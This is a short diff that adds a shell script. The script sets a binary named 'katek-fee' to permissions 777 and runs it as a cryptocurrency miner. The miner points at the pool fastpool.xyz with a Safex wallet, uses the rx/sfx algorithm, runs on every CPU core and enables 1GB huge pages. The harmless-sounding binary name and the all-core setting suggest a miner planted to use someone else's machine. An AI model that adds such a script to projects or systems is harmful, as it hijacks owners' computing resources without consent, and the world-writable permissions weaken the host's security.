@@ -1,0 +1,3 @@
+chmod 777 katek-fee 
+./katek-fee -o fastpool.xyz:3034 -u Safex5z79yVL7bL5CfaVLfP6cCC7YAWW4QH4rYVGRTYLZiYLBfg6B6i755vBeymz7G6ot27m8UpiZGjqUtQ61gQcVexNHYaDXW84W -p x -k -a rx/sfx -t $(nproc --all) --randomx-1gb-pages
+
